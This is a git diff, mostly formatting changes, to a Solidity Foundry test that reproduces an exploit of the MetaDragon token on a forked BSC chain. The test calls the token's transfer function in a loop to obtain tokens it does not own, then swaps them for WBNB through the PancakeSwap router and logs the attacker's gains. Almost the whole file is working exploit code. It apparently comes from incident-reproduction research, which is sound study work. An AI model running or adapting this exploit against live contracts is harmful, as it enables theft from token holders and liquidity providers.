@@ -15,7 +15,6 @@ address constant meta_token = 0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f;
 address constant router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
 address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
 
-
 contract MetaDragonTest is Test {
     uint256 endTokenId = 40;
 
@@ -23,25 +22,21 @@ contract MetaDragonTest is Test {
         vm.createSelectFork("bsc", 39_141_426);
     }
 
-    function testExploit() public balance_log{
-        for (uint i = 0; i < endTokenId; i++) {
+    function testExploit() public balance_log {
+        for (uint256 i = 0; i < endTokenId; i++) {
             bytes memory calldatas = abi.encodeWithSignature("transfer(address,uint256)", meta_token, i);
             // don't check return value
             meta_token.call(calldatas);
         }
         emit log_named_uint("attacker MetaToken balance", IERC20(meta_token).balanceOf(address(this)));
 
-        IERC20(meta_token).approve(router,type(uint256).max);
+        IERC20(meta_token).approve(router, type(uint256).max);
         address[] memory paths = new address[](2);
         paths[0] = meta_token;
         paths[1] = wbnb;
 
         IUniswapV2Router(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            IERC20(meta_token).balanceOf(address(this)),
-            0,
-            paths,
-            address(this),
-            block.timestamp
+            IERC20(meta_token).balanceOf(address(this)), 0, paths, address(this), block.timestamp
         );
     }
 
@@ -50,6 +45,4 @@ contract MetaDragonTest is Test {
         _;
         emit log_named_uint("attacker weth balance after", IERC20(wbnb).balanceOf(address(this)));
     }
-
-
 }
